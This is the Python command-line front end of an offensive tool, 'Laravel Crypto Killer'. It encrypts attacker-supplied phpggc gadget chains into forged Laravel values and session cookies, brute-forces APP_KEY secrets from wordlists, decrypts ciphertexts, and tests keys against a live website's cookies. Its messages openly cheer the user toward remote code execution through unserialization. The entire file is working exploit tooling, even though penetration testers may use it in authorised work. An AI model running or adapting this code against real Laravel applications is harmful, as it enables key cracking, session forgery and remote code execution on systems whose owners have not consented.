#!/usr/bin/env python3

import argparse
import sys
import base64
import os
import re
import signal
import json
from tqdm import tqdm
from concurrent.futures import ProcessPoolExecutor
from concurrent.futures import as_completed
from lib.core.laravel_encrypter import LaravelEncrypter
from lib.core.laravel_encrypter import LaravelEncrypterError

"""
Class LaravelCryptoKiller, defines all the CLI logic.
"""
class LaravelCryptoKiller():
    def __init__(self):
        self.laravel_encrypter = None
        self.threads = 10
        self.number_of_hit = 0
        self.number_of_serialized_data = 0
        self.results = []
        self.key_file = None

    """
    Function managing interuption
    """
    def signal_handler(self, sig, frame):
        os._exit(1)

    """
    Creates a progress bar to give intel on the probable duration of the bruteforce.
    The bruteforce uses self.threads as the number of threads to use.
    """
    def bruteforce_progress(self, function_to_use, ciphers):
        l = len(ciphers)
        with tqdm(total=l) as pbar:
            with ProcessPoolExecutor(max_workers=self.threads) as executor:
                futures = {executor.submit(function_to_use, cipher): cipher for cipher in ciphers}
                results = {}
                for future in as_completed(futures):
                    cipher = futures[future]
                    results[cipher] = future.result()
                    result = results[cipher]
                    pbar.update(1)
                    if result:
                        result["cipher"] = cipher
                        result["is_serialized_data"] = False
                        self.results.append(result)
                        if self.is_serialized_data(result["value"]):
                            self.number_of_serialized_data += 1
                            result["is_serialized_data"] = True
                        self.number_of_hit += 1

    """
    Takes a cipher and tries to bruteforce APP_KEY used to cipher it
    """
    def bruteforce_cipher(self, cipher):
        directory="wordlists"
        if self.key_file:
            result = self.laravel_encrypter.bruteforce_from_file(self.key_file, cipher)
        else:
            for filename in os.scandir(directory):
                if filename.is_file():
                    file_to_test = open(filename.path, "r")
                    result = self.laravel_encrypter.bruteforce_from_file(file_to_test, cipher)
                    if result:
                        to_print = "[+] It is your lucky day! A key was identified!\nCipher : {}\nKey : {}\n[*] Unciphered value\n{}".format(cipher, result["key"], result["value"]).strip()
                        if self.is_serialized_data(result["value"]):
                            to_print = "[+] It is your lucky day! A key was identified!\nCipher : {}\nKey : {}\n[*] Unciphered value\n{}\n[+] Matched serialized data in results!".format(cipher, result["key"], result["value"]).strip()
                        print(to_print)
                        break
        return result
    """
    Checks if the data seems like a PHP serialized string
    """
    def is_serialized_data(self, unciphered_data):
        result = re.search("(i|s|a|o|d|O):(.*);", unciphered_data)
        return result

    
    def main(self):
        usage = """
 ___                                _       ___                    _             __       _   _              
(O O)                              (_ )    ( O_`\                 ( )_          ( O)    _(_ )(_ )            
 | |      _ _ _ __  _ _ _   _   __  | |    | ( (_)_ __ _   _ _ _  | ,_)  _      |  |/')(_)| | | |   __  _ __ 
 | |    /'_` ( '__/'_` ( ) ( )/'__`\| |    | |  _( '__( ) ( ( '_`\| |  /'_`\    |  , < | || | | | /'__`( '__)
<  |__ ( (_| | | ( (_| | \_/ (  ___/| |   <  (_( | |  | (_) | (_) | |_( (_) )  <  | \`\| || | | |(  ___| |   
<_____/`\__,_(_) `\__,_`\___/`\____(___)  <_____/(_)  `\__, | ,__/`\__`\___/'  <__)  (_(_(___(___`\____(_)   
                                                     ( )_| | |                                             
                                                     `\___/(_)                                             
        This tool was firstly designed to craft payload targetting the Laravel decrypt() function from the package Illuminate\Encryption.
        
        It can also be used to decrypt any data encrypted via encrypt() or encryptString().

        The tool requires a valid APP_KEY to be used, you can also try to bruteforce them if you think there is a potential key reuse from a public project for example.

        Authors of the tool : @_remsio_, @Kainx42
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        """
        # Parsing command line arguments
        parser = argparse.ArgumentParser(description=usage, formatter_class=argparse.RawTextHelpFormatter)
        subparsers = parser.add_subparsers(title='subcommands', description='You can use the option -h on each subcommand to get more info', dest="subparser_name")

        # Encrypt options
        parser_encrypt = subparsers.add_parser('encrypt', help="Encrypt mode")
        parser_encrypt.add_argument("--key", "-k", default="", help="Key used by Laravel stored in APP_KEY in .env")
        parser_encrypt.add_argument("--value", "-v", default="", help="Value of the string data you want to laravel cipher (it has to be base64 encoded!). The place where you put a gadget chain from phpggc basically.", required=True)
        parser_encrypt.add_argument("--session_cookie", "-sc", default=False, help="Add this option to format the ciphered value to exploit a Laravel Session Cookie (option SESSION_DRIVER=cookie). it should be a 40 character long hex chain")

        # Decrypt options
        parser_decrypt = subparsers.add_parser('decrypt', help="Decrypt mode")
        parser_decrypt.add_argument("--key", "-k", default="", help="Key used by Laravel stored in APP_KEY in .env", required=True)
        parser_decrypt.add_argument("--value", "-v", default="", help="Value of the laravel ciphered data you want to uncipher", required=True)

        # Bruteforce options
        parser_bruteforce = subparsers.add_parser('bruteforce', help="Bruteforce potential values of APP_KEY. By default, all the values from the folder wordlists will be loaded.")
        parser_bruteforce.add_argument('--key_file', type=open, help="Path to the file used to bruteforce the APP_KEY, must contain one value per line", required=False)
        parser_bruteforce.add_argument('--cipher_file', type=open, help="Path to a file containing a list of ciphered values", required=False)
        parser_bruteforce.add_argument("--value", "-v", default="", help="Value of the laravel ciphered data on which you want to perform a bruteforce", required=False)
        parser_bruteforce.add_argument("--threads", "-t", type=int, default=10, help="Number of threads used during bruteforce (Default 10)", required=False)
        parser_bruteforce.add_argument("--result_file", default="results/results.json", help="File in which you want to save your results (default results/results.json)", required=False)

        # Check options
        parser_check = subparsers.add_parser('check', help="Check the valid of an "
                                                           "APP_KEY against a website")
        parser_check.add_argument('APP_URL', help="Website URL to check")
        parser_check.add_argument('APP_KEY', help="Key to check")

        args = parser.parse_args()

        if args.subparser_name == "encrypt":
            self.laravel_encrypter = LaravelEncrypter(args.key)
            try:
                if args.session_cookie:
                    print("[+] Here is your laravel ciphered session cookie, happy hacking mate!")
                    print(self.laravel_encrypter.encrypt_session_cookie(args.value, args.session_cookie).decode("ascii"))
                else:
                    print("[+] Here is your laravel ciphered value, happy hacking mate!")
                    print(self.laravel_encrypter.encrypt(args.value).decode("ascii"))
            except LaravelEncrypterError:
                print("[-] Unable to encrypt the data with the given key")
                sys.exit(1)
        elif args.subparser_name == "decrypt":
            self.laravel_encrypter = LaravelEncrypter(args.key)
            try:
                result = self.laravel_encrypter.decrypt(args.value)
            except LaravelEncrypterError:
                print("[-] Unable to decrypt the cipher with the given key")
                sys.exit(1)
            print("[+] Unciphered value identified!")
            print("[*] Unciphered value")
            print(result.decode("utf-8"))
            print("[*] Base64 encoded unciphered version")
            print(base64.b64encode(result))
            if self.is_serialized_data(result.decode("utf-8")):
                print("[+] Matched serialized data in results! It's time to exploit unserialization to get RCE mate!".format(self.number_of_serialized_data))
            sys.exit(0)
        elif args.subparser_name == "bruteforce":
            signal.signal(signal.SIGINT, self.signal_handler)
            if not args.value and not args.cipher_file:
                 print("[*] You should define the option -v or --file_cipher to use bruteforce mode")
                 sys.exit(1)
            self.laravel_encrypter = LaravelEncrypter()
            # load all ciphers, or only one depending on the options
            ciphers = []
            if args.cipher_file:
                for line in args.cipher_file:
                    ciphers.append(line.strip())
            else:
                ciphers.append(args.value)

            # By default, we use all the values from the folder wordlists
            if not args.key_file:
                directory = "wordlists"
                print("[*] The option --key_file was not defined, using files from the folder {}...".format(directory))
            
            self.number_of_hit = 0
            self.number_of_serialized_data = 0
            self.key_file = args.key_file
            self.threads = args.threads
            #Use of multithreading
            self.bruteforce_progress(self.bruteforce_cipher, ciphers)
            if args.cipher_file:
                print("[*] Data loaded from {}".format(args.cipher_file.name))
            print("[*] {} cipher(s) loaded".format(len(ciphers)))
            if self.number_of_hit > 0 or self.number_of_serialized_data > 0:
                print("[+] Found a valid key for {} cipher(s)!".format(self.number_of_hit))
                if self.number_of_serialized_data > 0:
                    print("[+] Matched {} serialized data in results! It's time to exploit unserialization to get RCE mate!".format(self.number_of_serialized_data))
                else:
                    print("[-] No serialization pattern matched, probably no way to unserialize from this :(")
                # Save results into a file
                print("[+] Results saved in the file {}".format(args.result_file))
                command_used = ' '.join(sys.argv)
                with open(args.result_file, 'w', encoding='utf-8') as file_results:
                    stats = {"results": self.results,"command_used": command_used, "number_of_ciphers_loaded": len(ciphers), "number_of_key_cracked": self.number_of_hit, "number_of_serialized_data": self.number_of_serialized_data}
                    json.dump(stats, file_results, ensure_ascii=False, indent=4)
                os._exit(0)
            print("[-] No key identified during the bruteforce attempt :(")
        elif args.subparser_name == "check":
            from lib.core.checker import checker
            cookies_decrypted = checker(args.APP_URL, args.APP_KEY)
            if cookies_decrypted:
                print("[+] Cookies decrypted:")
                for cookie, value in cookies_decrypted.items():
                    print(f"    * {cookie}", end="")
                    if LaravelCryptoKiller().is_serialized_data(value.decode("utf-8")):
                        print(" (contains serialized data)", end="")
                    print()
            else:
                print("[-] No cookies decrypted.")


if __name__ == "__main__":
    laravel_crypto_killer = LaravelCryptoKiller()
    laravel_crypto_killer.main()
    sys.exit(0)